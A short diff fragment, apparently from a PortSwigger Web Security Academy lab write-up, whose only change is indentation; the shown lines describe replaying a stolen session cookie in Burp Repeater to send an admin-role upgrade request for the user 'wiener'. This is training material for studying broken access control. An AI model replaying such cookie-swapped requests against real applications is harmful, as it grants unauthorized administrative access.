@@ -284,7 +284,7 @@ Check The Header Show ID
    Copy the Local user session cookie into the existing Burp Repeater request, change the username to yours, and replay it. 
      
      
-      GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+     GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
 Host: 0adf0050049b912fc0590c89008000d1.web-security-academy.net
 Cookie: session=rJx1TJ8LuyR3JD1EYR43W5OKaq5UtFM5
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
